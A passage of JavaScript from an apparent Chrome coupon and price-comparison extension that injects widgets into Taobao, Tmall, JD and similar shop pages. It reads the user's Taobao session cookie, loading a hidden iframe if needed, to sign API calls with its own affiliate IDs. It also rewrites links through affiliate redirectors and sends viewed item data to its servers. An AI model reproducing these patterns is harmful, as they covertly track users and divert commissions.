                            !function () {
                                if (k.list && k.list.length > 0) {
                                    var name = "";
                                    $.each(obj,function (m,n) {
                                        if (v == m) {
                                            name = n;
                                            return false;
                                        }
                                    });
                                    $(".dypTop9527-sameStyle").append(`<div class="fl" id="dypTop9527-sameStyle-${v}" data-douyamovepaopao="顶部+比较+${name}查看">
                                        <div class="dypTop9527-sameStyle-topMask"></div>
                                        <b class="${v}"></b><span>${name}</span>
                                        <span class="dypTop9527-sameStyle-price">¥${k.min}</span>
                                        <div class="dypTop9527-mask"></div>
                                        <div class="dypTop9527-sameStyleDrop" id="dypTop9527-sameStyleDrop-${v}">
                                            <ul></ul>
                                        </div>
                                    </div>`);
                                    var dom = $("#dypTop9527-sameStyle-" + v);
                                    var domDrop = $("#dypTop9527-sameStyleDrop-" + v);
                                    var allData = k.list;  //已经加载好的数据存进一个数组里面
                                    dom.hover(function () {
                                        domDrop.show();
                                    },function () {
                                        domDrop.hide();
                                    });
                                    var list = "";
                                    var icon = v;      //
                                    $.each(allData,function (v,k) {
                                        var url = changeUrl(icon,k);
                                        var img = k.sitename ? k.originalimage : k.pic_url;
                                        var title = k.sitename ? k.title : k.raw_title;
                                        var commentnum = k.sitename ? k.commentnum : k.comment_count;
                                        var cutprice = k.sitename ? k.cutprice : k.view_price;
                                        list += `<li data-douyababapaopao="顶部+比价+${icon}">
                                            <a href="${url.url}" target="_blank" class="dypClear" data-title="${url.title}" data-id="${url.url}" rel="noreferrer">
                                                <div class="fl"><img src="${img}"></div>
                                                <div class="fl dypTop9527-sameStyleDrop-itemR">
                                                    <div class="${icon} dypTop9527-sameStyleDrop-icon"></div>
                                                    <div class="dypTop9527-sameStyleDrop-title">${title}</div>
                                                    <div class="dypClear">
                                                        <div class="fl dypTop9527-sameStyleDrop-sale">评价${commentnum}</div>
                                                        <div class="fr dypTop9527-sameStyleDrop-price">¥${cutprice}</div>
                                                    </div>
                                                </div>
                                            </a>
                                        </li>`;
                                    });
                                    domDrop.children("ul").html(list);
                                    if (icon == "tb" || icon == "tm") {
                                        domDrop.on("click","a",function (e) {
                                            e.preventDefault();
                                            var that = $(this);
                                            var title = that.data("title");
                                            var id = that.data("id");
                                            var errorUrl = "https://item.taobao.com/item.htm?id=" + id;
                                            tmAjax(errorUrl,title,id);
                                        });
                                    }
                                }
                            }();
                        });
                        var totalWithArr = [];  //
                        $(".dypTop9527-sameStyle>div").each(function () {
                            totalWithArr.push($(this).width());
                        });
                        function initBiWidth() {
                            var m = totalWithArr.length;
                            if (m < 2) {
                                return;
                            }
                            var totalWith = 0;
                            $.each(totalWithArr,function (v,k) {
                                totalWith += k;
                                totalWith += 24;
                                if (totalWith > $(".dypTop9527-sameStyle").width()) {
                                    m = v;
                                    return false;
                                }
                            });
                            $(".dypTop9527-sameStyle>div").eq(m - 1).nextAll().hide();
                            $(".dypTop9527-sameStyle>div").eq(m - 1).prevAll().show();
                            $(".dypTop9527-sameStyle>div").eq(m - 1).show();
                        }   //顶部比价的宽度加载后js设定
                        initBiWidth();
                        $(window).on("resize",function () {
                            initBiWidth();
                        });
                    }   //append相似商品标题
                    getSameNew(url);
                    if (plat == 'tm' || plat == 'tb') {
                        getSame();
                    }
                }            //全网比价
                function appendPriceCut(e) {
                    $("#dypMid9527 .dypMid9527-box-coupon").append(`<div class="dypMid9527-coupon-priceCut dypClear">
                        <div><a href="${qqOnline}" target="_blank" data-douyababapaopao="工具+QQ在线" class="dypMid9527-coupon-priceCutQQ"></a></div>
                        <div id="dypMid9527-coupon-priceCutButt" data-douyamovepaopao="工具+降价+二维码">
                            <div class="dypMid9527-coupon-priceCutIcon douyapuyaohuang"></div>
                            <div class="dypMid9527-coupon-erweima">
                                <div class="dypMid9527-coupon-erweimaImg"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt=""></div>
                                <div class="dypMid9527-coupon-erweimaTitle">微信扫码</div>
                                <div class="dypMid9527-coupon-erweimaTitle">实时关注降价提醒</div>
                            </div>
                        </div>
                    </div>`);
                    if (e == 1) {
                        $(".dypMid9527-box-coupon").css("min-height","189px");
                        if (infoGroup.plat == "jd") {
                            $(".dypMid9527-coupon-priceCut").css({"justify-content":"initial","padding-left":35});
                        }
                    }
                    if (infoGroup.plat == "tm" || infoGroup.plat == "tb") {
                        $(".dypMid9527-coupon-priceCutQQ").css({"margin-left":0,"margin-right":30})
                    }
                    var t,first = 0;
                    var nowPlat = infoGroup.plat;
                    switch (nowPlat) {
                        case "tm":
                            t = 2;
                            break;
                        case "tb":
                            t = 1;
                            break;
                        case "jd":
                            t = 3;
                            break;
                        case "sn":
                            t = 4;
                            break;
                        case "gm":
                            t = 5;
                            break;
                        case "dd":
                            t = 6;
                            break;
                    }
                    $("#dypMid9527-coupon-priceCutButt").hover(function () {
                        if (first == 0) {
                            first = 1;
                            var urls = location.href;
                            var textPrice = infoGroup.price;
                            // var textPrice = 10;
                            if (nowPlat == "tm" || nowPlat == "tb") {
                                chrome.extension.sendMessage({
                                    name:"universal",url:"http://min.douyapu.com/wechat/qrCode.php",type:"get",dataType:"html",
                                    data:{"itemId":infoGroup.id,"type":t,"price":infoGroup.price}
                                },function (res1) {
                                    if (res1) {
                                        $(".dypMid9527-coupon-erweimaImg img").attr("src",res1);
                                    } else {
                                        first = 0;
                                    }
                                });
                                chrome.extension.sendMessage({
                                    name:"universal",url:"http://min.douyapu.com/wechat/collect.php",type:"post",dataType:"json",
                                    data:{"itemId":infoGroup.id,"type":t,"price":textPrice,"reqMethod":"getPrice"}
                                },function (res) {
                                    if (res && res.results && res.results.length) {
                                        var arr = "";
                                        $.each(res.results,function (v,k) {
                                            if (k * 1 > textPrice) {
                                                arr += k + "|";
                                            }
                                        });
                                        if (arr.length) {
                                            chrome.extension.sendMessage({
                                                name:"universal",url:"https://storage.douyapu.com/taobao/sign.php",type:"get",dataType:"json",
                                                data:{"url":urls,"title":infoGroup.title}    //天猫淘宝用于请求淘口令
                                            },function (res1) {
                                                if (res1 && res1.status && res1.status == 1) {
                                                    var taokou;
                                                    taokou = `https://storage.douyapu.com/wechat/decline?title=${infoGroup.title}&price=${infoGroup.price}&shop=${infoGroup.shop}&sign=${res1.sign}&pic=${infoGroup.pic}&total30=${infoGroup.sale}`;
                                                    chrome.extension.sendMessage({
                                                        name:"universal",url:"http://min.douyapu.com/wechat/collect.php",type:"post",dataType:"json",
                                                        data:{"itemId":infoGroup.id,"type":t,"price":arr,"reqMethod":"send","urls":taokou}
                                                    },function (res2) {
                                                    });
                                                }
                                            });
                                        }
                                    }
                                });
                            }
                            if (nowPlat == "jd" || nowPlat == "sn" || nowPlat == "gm" || nowPlat == "dd") {
                                chrome.extension.sendMessage({
                                    name:"universal",url:"http://min.douyapu.com/wechat/qrCode.php",type:"get",dataType:"html",
                                    data:{"itemId":infoGroup.id,"type":t,"price":infoGroup.price}
                                },function (res1) {
                                    if (res1) {
                                        $(".dypMid9527-coupon-erweimaImg img").attr("src",res1);
                                    } else {
                                        first = 0;
                                    }
                                });
                                chrome.extension.sendMessage({
                                    name:"universal",url:"http://min.douyapu.com/wechat/collect.php",type:"post",dataType:"json",
                                    data:{"itemId":infoGroup.id,"type":t,"price":textPrice,"reqMethod":"getPrice"}
                                },function (res) {
                                    if (res && res.results && res.results.length) {
                                        var arr = "";
                                        $.each(res.results,function (v,k) {
                                            if (k * 1 > textPrice) {
                                                arr += k + "|";
                                            }
                                        });
                                        if (arr.length) {
                                            var taokou;
                                            if (nowPlat == "jd") {
                                                taokou = `http://www.yiyaowei.com/index.php?mod=jump&act=out&subid=VGNO76KE&url=${urls}`;
                                            } else if (nowPlat == "sn" || nowPlat == "dd") {
                                                taokou = 'https://p.gouwuke.com/b?w=949095&e=&t=' + urls;
                                            } else if (nowPlat == "gm") {
                                                taokou = `${urls}?cmpid=cps_17016_22656&sid=17016&wid=22656`;
                                            }
                                            chrome.extension.sendMessage({
                                                name:"universal",url:"http://min.douyapu.com/wechat/collect.php",type:"post",dataType:"json",
                                                data:{"itemId":infoGroup.id,"type":t,"price":arr,"reqMethod":"send","urls":taokou}
                                            },function (res2) {
                                            });
                                        }
                                    }
                                });
                            }
                        }
                        $(".dypMid9527-title").css("z-index","998");
                        $("#dypMid9527").addClass("zdmax");
                        var width = $(".dypMid9527-borderMask").width();
                        $(".dypMid9527-erweima-mask").css("width",width).show();
                        $(".dypMid9527-coupon-erweima").show();
                        $(".dypMid9527-coupon-priceCutIcon").removeClass("douyapuyaohuang");
                    },function () {
                        $(".dypMid9527-title").css("z-index","1000");
                        $("#dypMid9527").removeClass("zdmax");
                        $(".dypMid9527-erweima-mask").hide();
                        $(".dypMid9527-coupon-erweima").hide();
                        $(".dypMid9527-coupon-priceCutIcon").addClass("douyapuyaohuang");
                    });//创建二维码
                }         //降价提醒部分
                function startVip() {
                    var page = 1;   // 当前第几页
                    var sign = 1;
                    var first = 0;
                    var rowHeight = 151;
                    var reqUrl = `${mainUrl.min}&v=subCategory:${infoGroup.rCat}&page_size=20&page_num=`;
                    if (infoGroup.plat != 'tb' && infoGroup.plat != 'tm') {
                        reqUrl = `${mainUrl.min}&v=subCategory:16&page_size=20&page_num=`;
                    }
                    $(".dypTop9527-vipCoupon").hover(function () {
                        if (first == 0) {
                            get();
                            first = 1;
                        }
                        $(".dypTop9527-vipCouponDrop").show();
                        var scrollHeight = $(window).scrollTop();
                        $(window).on('scroll.dypScroll',function () {
                            $(window).scrollTop(scrollHeight);
                        });
                    },function () {
                        $(".dypTop9527-vipCouponDrop").hide();
                        $(window).off('scroll.dypScroll');
                    });
                    $(".dypTop9527-vipCouponDrop ul").on("scroll",function () {
                        if (sign == 1) {
                            var allHeight = rowHeight * $(this).children().length;
                            if (($(this).scrollTop() + $(this).height()) == allHeight) {
                                get();
                            }
                        }
                    });
                    function get() {
                        sign = 0;
                        chrome.extension.sendMessage({
                            name:"universal",url:reqUrl + page,type:"get",dataType:"json"
                        },function (e) {
                            if (e && e.res && e.res.length > 0) {
                                append(e.res);
                                page += 1;
                                sign = 1;
                            }
                        });
                    }   //
                    function append(d) {
                        var list = "";
                        $.each(d,function (v,k) {
                            var item = k;
                            if (item.amount) {
                                var couponNum = item.amount ? item.amount : 0;
                                var a = "tb";
                                if (item.type == "2") {
                                    a = "tm";
                                }
                                list += `<li data-douyababapaopao="顶部+值得买">
                                    <a data-url="https:${item.shareUrl}" class="dypClear">
                                        <div class="fl"><img src="${item.picUrl}_140x140.jpg"></div>
                                        <div class="fl dypTop9527-vipCouponDrop-itemR">
                                            <div class="${a} dypTop9527-vipCouponDrop-icon"></div>
                                            <div class="dypTop9527-vipCouponDrop-title">${item.title}</div>
                                            <div class="dypTop9527-vipCouponDrop-sale">月销量${item.biz30Day}</div>
                                            <div class="dypTop9527-vipCouponDrop-price">券后价 ：
                                                <span class="dypTop9527-vipCouponDrop-nprice">¥${numSub(item.discountPrice,couponNum)}</span>
                                                &nbsp;<span class="dypTop9527-vipCouponDrop-oprice">¥${item.discountPrice}</span>
                                            </div>
                                            <div class="dypClear">
                                                <div class="fl dypTop9527-vipCouponDrop-buttl">${couponNum}元券</div>
                                                <div class="fl dypTop9527-vipCouponDrop-buttr">立即领取</div>
                                            </div>
                                            <div class="dypTop9527-vipCouponDrop-icon1212"></div>
                                        </div>
                                    </a>
                                </li>`;
                            }
                        });
                        $('.dypTop9527-vipCouponDrop ul').append(list);
                    }   //
                    $('.dypTop9527-vipCouponDrop ul').on("click","a",function () {
                        openWindow($(this).data("url"));
                    });
                }                //顶部(值得买)
                function qtCoupon() {
                    if (infoGroup.plat != 'sn' && infoGroup.plat != 'gm' && infoGroup.plat != 'dd') {
                        return;
                    }
                    var oli1 = `<p class="dypClear">
                        <a href="${mainUrl.website}" class="fr" target="_blank" data-douyababapaopao="工具+优惠券+更多">
                            <span class="dypMid9527-coupon-topIcon"></span><span>更多优惠券>></span>
                        </a>
                    </p>
                    <div class="dypMid9527-no-coupon">
                        <b class="dypMid9527-has-no"></b>
                        <span>不好意思 , 暂未适配当前平台优惠券</span>
                    </div>`;
                    $("#dypMid9527 .dypMid9527-box-coupon").html(oli1);
                    $("#dypMid9527 .dypMid9527-box-coupon").append(`<div class="dypMid9527-erweima-mask"></div>`);
                    appendPriceCut(2); //其他平台
                }                //苏宁以及其他平台优惠券
                !function () {
                    if (infoGroup.plat != 'tm' && infoGroup.plat != 'tb' && infoGroup.plat != 'ju') {
                        return
                    }
                    $(".dypMid9527-same").show();
                    infoGroup.id = getUrlParam("id");
                    var itemId = infoGroup.id;
                    var htmlT = $('html').html();
                    if (infoGroup.plat == 'ju' || infoGroup.plat == 'tm') {
                        changeColor("#F40137","天　猫","tm");
                        if (infoGroup.plat == 'ju') {
                            infoGroup.id = getUrlParam("item_id");
                            itemId = infoGroup.id;
                        } else {
                            infoGroup.title = htmlT.match(/"title":"(.+?)"/) ? htmlT.match(/"title":"(.+?)"/)[1] : "";
                            infoGroup.rCat = htmlT.match(/"rootCatId":"(\d+)",/) ? htmlT.match(/"rootCatId":"(\d+)",/)[1] : "";
                            infoGroup.seller = htmlT.match(/"userId":"(\d+)"/) ? htmlT.match(/"userId":"(\d+)",/)[1] : "";
                        }
                    } else {
                        $("#dypMid9527").css("z-index","100000");
                        changeColor("#F42901","淘　宝","tb");
                        infoGroup.rCat = htmlT.match(/(\s+)rcid(\s+):(\s+)'(\d+)'/) ? htmlT.match(/(\s+)rcid(\s+):(\s+)'(\d+)'/)[4] : "";
                        infoGroup.seller = htmlT.match(/sellerId(\s+):(\s+)'(\d+)'/) ? htmlT.match(/sellerId(\s+):(\s+)'(\d+)'/)[3] : "";
                        infoGroup.title = htmlT.match(/title(\s+):(\s+)'(.*?)'/) ? unicodeToUtf8(htmlT.match(/title(\s+):(\s+)'(.*?)'/)[3]) : "";
                    }   //
                    var num = 0;//
                    var favCount = "";//
                    var tbCookie = '';//淘宝cookie
                    var creatBottomSign = 0;    //下面代码的标记
                    function couCount() {
                        num += 1;
                        if (num == 4) {
                            startCou();
                            starGetRec();
                            var url = "https://item.taobao.com/item.htm?id=" + itemId;
                            if (infoGroup.plat == "tm") {
                                url = "https://detail.tmall.com/item.htm?id=" + itemId;
                            }
                            startPrice(url);
                            startSame(url);
                            startVip();
                            startBuyShow();
                            startMustSee();
                        }
                    }   //
                    $.ajax({
                        url:"https://s.taobao.com/search?app=i2i&nid=" + itemId,
                        success:function (e) {
                            var r = e.match(/g_page_config\s=\s(.*)/);
                            if (r && r[1] && r[1].match(/({.*});/) && r[1].match(/({.*});/)[1] && JSON.parse(r[1].match(/({.*});/)[1])) {
                                var obj = JSON.parse(r[1].match(/({.*});/)[1]);
                                if (obj && obj.mods && obj.mods.singleauction && obj.mods.singleauction.data) {
                                    obj = obj.mods.singleauction.data;
                                    infoGroup.title = infoGroup.title ? infoGroup.title : obj.title;
                                    infoGroup.price = infoGroup.price ? infoGroup.price : obj.view_price;
                                    infoGroup.pid = obj.pid;
                                    infoGroup.seller = infoGroup.seller ? infoGroup.seller : obj.user_id;
                                    infoGroup.shop = infoGroup.shop ? infoGroup.shop : obj.nick;
                                    infoGroup.pic = infoGroup.pic ? infoGroup.pic : obj.pic_url;
                                    if (infoGroup.plat == "ju") {
                                        infoGroup.plat = obj.detail_url.match("item.taobao.com") ? "tb" : "tm"
                                    }
                                }
                            }
                        },complete:function () {
                            couCount();
                        }
                    }); //淘宝搜索拿商品数据
                    $.ajax({
                        url:"https://pub.alimama.com/items/search.json?q=https://item.taobao.com/item.htm?id=" + itemId,
                        success:function (e) {
                            if (e && e.data && e.data.pageList && e.data.pageList[0]) {
                                var data = e.data.pageList[0];
                                infoGroup.title = infoGroup.title ? infoGroup.title : data.title;
                                infoGroup.price = infoGroup.price ? infoGroup.price : data.zkPrice;
                                infoGroup.seller = infoGroup.seller ? infoGroup.seller : data.sellerId;
                                infoGroup.rCat = infoGroup.rCat ? infoGroup.rCat : data.rootCatId;
                                infoGroup.shop = infoGroup.shop ? infoGroup.shop : data.shopTitle;
                                infoGroup.pic = infoGroup.pic ? infoGroup.pic : data.pictUrl;
                                infoGroup.sale = data.biz30day;
                                infoGroup.amount = data.couponAmount;
                                infoGroup.amountReq = data.couponStartFee;
                                infoGroup.amountT = data.couponTotalCount;
                                infoGroup.amountL = data.couponLeftCount;
                                infoGroup.tkCom = data.tkCommFee;
                                infoGroup.startT = data.couponEffectiveStartTime;
                                infoGroup.endT = data.couponEffectiveEndTime;
                                if (infoGroup.plat == "ju") {
                                    infoGroup.plat = (data.userType == 1) ? "tm" : "tb"
                                }
                            }
                        },
                        complete:function () {
                            couCount();
                        }
                    }); //阿里妈妈拿商品数据
                    $.ajax({
                        url:"https://acs.m.taobao.com/h5/mtop.taobao.detail.getdetail/6.0/",
                        data:{data:`{"itemNumId":"${itemId}"}`},
                        success:function (e) {
                            if (e && e.data && e.data.item) {
                                var data = e.data.item;
                                infoGroup.title = infoGroup.title ? infoGroup.title : data.title;
                                infoGroup.rCat = infoGroup.rCat ? infoGroup.rCat : data.rootCategoryId;
                                infoGroup.pic = infoGroup.pic ? infoGroup.pic : data.images[0];
                                favCount = data.favcount;
                            }
                            if (e && e.data && e.data.apiStack && e.data.apiStack[0] && e.data.apiStack[0].value) {
                                try {
                                    var p = JSON.parse(e.data.apiStack[0].value);
                                    if (p && p.skuCore && p.skuCore.sku2info && p.skuCore.sku2info[0] && p.skuCore.sku2info[0].price) {
                                        var price = p.skuCore.sku2info[0].price;
                                        var sale = p.item.sellCount;
                                        infoGroup.price = infoGroup.price ? infoGroup.price : (price.priceMoney ? price.priceMoney / 100 : "");
                                        infoGroup.sale = sale ? sale : infoGroup.sale;
                                    }
                                } catch (err) {
                                }
                            }
                            if (e && e.data && e.data.seller) {
                                var seller = e.data.seller;
                                infoGroup.seller = infoGroup.seller ? infoGroup.seller : seller.userId;
                                infoGroup.shop = infoGroup.shop ? infoGroup.shop : seller.shopName;
                            }
                        },
                        complete:function () {
                            couCount();
                        }
                    }); //淘宝H5商品数据
                    getTbCookie(couCount);
                    function getTbCookie(call) {
                        chrome.extension.sendMessage({
                            name:"getCook",url:"https://www.taobao.com/",key:"_m_h5_tk"
                        },function (d) {
                            if (d && d[0] && d[0].value) {
                                tbCookie = d[0].value;
                                call();
                            } else {
                                $("body").append(`<iframe src="//h5.m.taobao.com/" id="douya-yangxue9527" style="display:none"></iframe>`);
                                setTimeout(function () {
                                    $("#douya-yangxue9527").remove();
                                    getTbCookie(call)
                                },2000);
                            }
                        });
                    }// 获取淘宝cookie
                    var dyClickUrl = '';//
                    function startCou() {
                        var page = 1;
                        var getH5CouNum = 0;//
                        function getDan() {
                            var time = Date.now();
                            var title = infoGroup.title;
                            var s = `{"q":"${title}","pid":"${mainUrl.myMmId}","page":${page},"useItemCouponPage":"1","lunaUrlParam": "{'algo_sort':'mixcoupon','rank':'rank_profile:FirstRankScorer_atbh5','PS':'tk_item_score_atbh5','appBucket':'h'}"}`;
                            $.ajax({
                                url:"https://acs.m.taobao.com/h5/mtop.aitaobao.item.search/7.0/",type:"get",dataType:"json",
                                data:{
                                    v:"7.0",api:"mtop.aitaobao.item.search",appKey:"12574478",t:time,
                                    sign:md5(tbCookie.split("_")[0] + "&" + time + "&12574478&" + s),data:s
                                },
                                success:function (r) {
                                    if (r && r.ret && r.ret[0] && r.ret[0].match("调用成功")) {
                                        if (r && r.data && r.data.items && r.data.items.length) {
                                            var data = r.data.items;
                                            var hasSwi = 1;
                                            $.each(data,function (v,k) {
                                                if (k.nid == itemId) {
                                                    if (k.couponAmount) {
                                                        infoGroup.amount = k.couponAmount / 100;
                                                        infoGroup.amountReq = infoGroup.amountReq ? infoGroup.amountReq : `${Math.round(k.discountPrice)}`;
                                                        k.discountPrice && (infoGroup.price = infoGroup.price ? infoGroup.price : k.discountPrice);
                                                        dyClickUrl = k;
                                                        hasDan(k);
                                                    } else {
                                                        noDan(k);   //有对应数据但无优惠券的
                                                    }
                                                    hasSwi = 0;
                                                    return false;
                                                }
                                            });
                                            if (hasSwi) {
                                                if (page == 3) {
                                                    noDan(0);    //数据没对应ID
                                                    return false
                                                } else {
                                                    page++;
                                                    getDan();
                                                }
                                            }
                                        } else {
                                            noDan(0);    //搜索无任何数据
                                        }
                                    } else {
                                        getH5CouNum++;
                                        if (getH5CouNum == 3) {
                                            noDan(0);    //请求不成功的
                                            return false
                                        } else {
                                            getTbCookie(getDan);
                                        }
                                    }
                                }
                            });
                        }//获取随机pid点击优惠券并上报
                        var page1 = 1;
                        var getH5CouNum1 = 0;//
                        function getQrDan() {
                            var time = Date.now();
                            var title = infoGroup.title;
                            var s = `{"q":"${title}","pid":"${mainUrl.phoneId}","page":${page1},"useItemCouponPage":"1","lunaUrlParam": "{'algo_sort':'mixcoupon','rank':'rank_profile:FirstRankScorer_atbh5','PS':'tk_item_score_atbh5','appBucket':'h'}"}`;
                            $.ajax({
                                url:"https://acs.m.taobao.com/h5/mtop.aitaobao.item.search/7.0/",type:"get",dataType:"json",
                                data:{
                                    v:"7.0",api:"mtop.aitaobao.item.search",appKey:"12574478",t:time,
                                    sign:md5(tbCookie.split("_")[0] + "&" + time + "&12574478&" + s),data:s
                                },
                                success:function (r) {
                                    if (r && r.ret && r.ret[0] && r.ret[0].match("调用成功")) {
                                        if (r && r.data && r.data.items && r.data.items.length) {
                                            var data = r.data.items;
                                            var hasSwi = 1;
                                            $.each(data,function (v,k) {
                                                if (k.nid == itemId) {
                                                    if (k.couponAmount) {
                                                        makeScan(k,"has");
                                                        creatBottom(k,1);
                                                    } else {
                                                        makeScan(k,"no"); //有对应转链链接无优惠券
                                                    }
                                                    hasSwi = 0;
                                                    return false;
                                                }
                                            });
                                            if (hasSwi) {
                                                if (page1 == 3) {
                                                    makeScan(0,"no"); //数据没对应ID
                                                    return false
                                                } else {
                                                    page1++;
                                                    getQrDan();
                                                }
                                            }
                                        } else {
                                            makeScan(0,"no"); //搜索无任何数据
                                        }
                                    } else {
                                        getH5CouNum1++;
                                        if (getH5CouNum1 == 3) {
                                            makeScan(0,"no"); //请求不成功的
                                            return false
                                        } else {
                                            getTbCookie(getQrDan);
                                        }
                                    }
                                }
                            });
                        }//获取手机pid二维码优惠券
                        var page2 = 1;
                        var getH5CouNum2 = 0;//
                        function getPostDan() {
                            var time = Date.now();
                            var title = infoGroup.title;
                            var s = `{"q":"${title}","pid":"${mainUrl.postId}","page":${page2},"useItemCouponPage":"1","lunaUrlParam": "{'algo_sort':'mixcoupon','rank':'rank_profile:FirstRankScorer_atbh5','PS':'tk_item_score_atbh5','appBucket':'h'}"}`;
                            $.ajax({
                                url:"https://acs.m.taobao.com/h5/mtop.aitaobao.item.search/7.0/",type:"get",dataType:"json",
                                data:{
                                    v:"7.0",api:"mtop.aitaobao.item.search",appKey:"12574478",t:time,
                                    sign:md5(tbCookie.split("_")[0] + "&" + time + "&12574478&" + s),data:s
                                },
                                success:function (r) {
                                    if (r && r.ret && r.ret[0] && r.ret[0].match("调用成功")) {
                                        if (r && r.data && r.data.items && r.data.items.length) {
                                            var data = r.data.items;
                                            var hasSwi = 1;
                                            $.each(data,function (v,k) {
                                                if (k.nid == itemId) {
                                                    if (k.couponAmount) {
                                                        saveCoupon(k);
                                                    }
                                                    hasSwi = 0;
                                                    return false;
                                                }
                                            });
                                            if (hasSwi) {
                                                if (page2 == 3) {
                                                    return false
                                                } else {
                                                    page2++;
                                                    getPostDan();
                                                }
                                            }
                                        }
                                    } else {
                                        getH5CouNum2++;
                                        if (getH5CouNum2 == 3) {
                                            return false
                                        } else {
                                            getTbCookie(getPostDan);
                                        }
                                    }
                                }
                            });
                        }//获取手机pid二维码优惠券
                        getDan();
                        $("#dypAbs9527").on("mouseenter",".dypAbs9527-coupon-qr",function () {
                            $(this).children(".dypAbs9527-coupon-qrBox").show();
                        });
                        $("#dypAbs9527").on("mouseleave",".dypAbs9527-coupon-qr",function () {
                            $(this).children(".dypAbs9527-coupon-qrBox").hide();
                        });
                        function hasDan(k) {
                            var amount = infoGroup.amount;
                            var amountReq = `满${infoGroup.amountReq}元减${k.couponAmount / 100}元`;
                            var urls = `https://uland.taobao.com/coupon/edetail?e=${getParam(k.clickUrl,"e")}`;
                            $('#dypAbs9527').prepend(`<div class="dypAbs9527-coupon">
                                <div class="dypAbs9527-coupon-back" data-douyababapaopao="工具+优惠券+外部领取">
                                    <div class="dypAbs9527-coupon-amount">¥ <span>${amount}</span> 优惠券</div>
                                    <div>${amountReq}</div>
                                </div>
                                <div class="dypAbs9527-coupon-contact">
                                    <div class="dypAbs9527-coupon-price">券后价 <span>${numSub(k.discountPrice,amount)}元</span><a href="${qqOnline}" target="_blank"><b data-douyababapaopao="工具+外部QQ群"></b></a></div>
                                    <div class="dypAbs9527-coupon-time dypClear">
                                        <div class="fl">还剩 &nbsp;</div>
                                        <div id="dypAbs9527-coupon-time" class="fl">
                                            <span class="day">00</span><span class="dypMid9527-c-2c2c2c">日</span> <span class="hour">00</span><span class="dypMid9527-c-2c2c2c">时</span>
                                            <span class="mini">00</span><span class="dypMid9527-c-2c2c2c">分</span> <span class="sec">00</span>.<span class="hm">0</span><span class="dypMid9527-c-2c2c2c">秒</span>
                                        </div>
                                    </div>
                                </div>
                                <div class="dypAbs9527-coupon-qr" data-douyamovepaopao="工具-外面二维码">
                                    <div class="dypAbs9527-coupon-qrIcon"></div>
                                    <div>手淘领券</div>
                                    <div class="dypAbs9527-coupon-qrBox">
                                        <div class="dypAbs9527-coupon-qrImg"></div>
                                        <div class="dypAbs9527-coupon-qrTitle">手淘扫码领券<br>商品<span></span></div>
                                    </div>
                                </div>
                            </div>`);
                            $(".dypAbs9527-coupon-back").click(function () {
                                openWindow(urls);
                            });
                            try {
                                $("#dypAbs9527-coupon-time").fnTimeCountDown(infoGroup.endT + ' 23:59:59');
                            } catch (e) {
                            }
                            function delTime() {
                                var day = 7;
                                var time = new Date().getTime() - day * 86400000;
                                for (let i = hasPostArr.length - 1; i >= 0; i--) {
                                    if (hasPostArr[i].time < time) {
                                        hasPostArr.splice(i,1);
                                    }
                                }
                                chrome.storage.local.set({dypPostCou20180709:hasPostArr});
                            }   //删除事件超过7天的优惠券元素
                            var postSwi = 1;
                            $.each(hasPostArr,function (v,k) {
                                if (k.id == itemId) {
                                    postSwi = 0;
                                    return false;
                                }
                            });
                            if (postSwi) {
                                if (hasPostArr.length > 99) {
                                    hasPostArr.shift();
                                }
                                hasPostArr.push({id:itemId,time:new Date().getTime()});
                                chrome.storage.local.set({dypPostCou20180709:hasPostArr},function () {
                                    delTime();
                                });
                            } else {
                                delTime();
                            }
                            getQrDan();
                            getPostDan();
                        }//
                        function noDan(k) {
                            $('#dypAbs9527').prepend(`<div class="dypAbs9527-coupon">
                                <div class="dypAbs9527-coupon-back-no">
                                </div>
                                <div class="dypAbs9527-coupon-contact-no">
                                    <div>没有券哦，别难过~<a href="${qqOnline}" target="_blank"><b data-douyababapaopao="工具+外部QQ群"></b></a></div>
                                    <div>用手机淘宝扫描右侧二维码 , 3秒快捷下单~</div>
                                </div>
                                <div class="dypAbs9527-coupon-arrow"></div>
                                <div class="dypAbs9527-coupon-qr" data-douyamovepaopao="工具-外面二维码">
                                    <div class="dypAbs9527-coupon-qrIcon"></div>
                                    <div>扫码下单</div>
                                    <div class="dypAbs9527-coupon-qrBox">
                                        <div class="dypAbs9527-coupon-qrImg"></div>
                                        <div class="dypAbs9527-coupon-qrTitle">打开手机淘宝<br>扫码轻松下单</div>
                                    </div>
                                </div>
                            </div>`);
                            var needPost = 0;
                            var index = 0;
                            $.each(hasPostArr,function (v,k) {
                                if (k.id == itemId) {
                                    index = v;
                                    needPost = 1;
                                    return false;
                                }
                            });
                            if (needPost) {
                                hasPostArr.splice(index,1);
                                chrome.storage.local.set({dypPostCou20180709:hasPostArr});
                                saveCoupon(k);
                            } else {
                            }
                            getQrDan();
                        }//
                        function saveCoupon(e) {
                            var goodRate = "";
                            var rateNum = 0;        //
                            function rateCount() {
                                rateNum++;
                                if (rateNum == 1) {
                                    postTo()
                                }
                            }//
                            $.ajax({
                                url:"https://rate.taobao.com/detailCommon.htm?auctionNumId=" + itemId,
                                type:"get",
                                dataType:"html",
                                success:function (d) {
                                    d = trim(d);
                                    d = d.substr(1,d.length - 2);
                                    try {
                                        d = JSON.parse(d);
                                        goodRate = d.data.count.total ? (d.data.count.good / d.data.count.total * 100).toFixed(2) : 0;
                                    } catch (err) {
                                    }
                                },
                                complete:function () {
                                    rateCount();
                                }
                            });
                            function postTo() {
                                var type = (infoGroup.plat == "tm") ? 2 : 1;
                                var postData = {
                                    itemId:infoGroup.id,
                                    title:infoGroup.title,
                                    category:infoGroup.rCat,
                                    discountPrice:infoGroup.price,
                                    reservePrice:"",
                                    picUrl:infoGroup.pic,
                                    effectiveStartTime:"",
                                    effectiveEndTime:"",
                                    shareUrl:"",
                                    comment:goodRate,
                                    source:type,
                                    startFee:"",
                                    amount:"",
                                    totalCount:"",
                                    leftCount:"",
                                    biz30Day:infoGroup.sale
                                };
                                if (e) {
                                    postData.reservePrice = e.reservePrice;
                                    if (e.couponAmount) {
                                        postData.shareUrl = "//uland.taobao.com/coupon/edetail?e=" + getParam(e.clickUrl,"e");
                                        postData.amount = infoGroup.amount;
                                        postData.effectiveEndTime = infoGroup.endT;
                                        postData.effectiveStartTime = infoGroup.startT;
                                        postData.startFee = infoGroup.amountReq;
                                        postData.totalCount = infoGroup.amountT;
                                        postData.leftCount = infoGroup.amountL;
                                    }
                                }
                                var base64Post = '';
                                $.each(postData,function (v,k) {
                                    if (v == "rate") {
                                        $.each(k,function (m,n) {
                                            if (n) {
                                                base64Post += `${Base64.encode(n)}|`
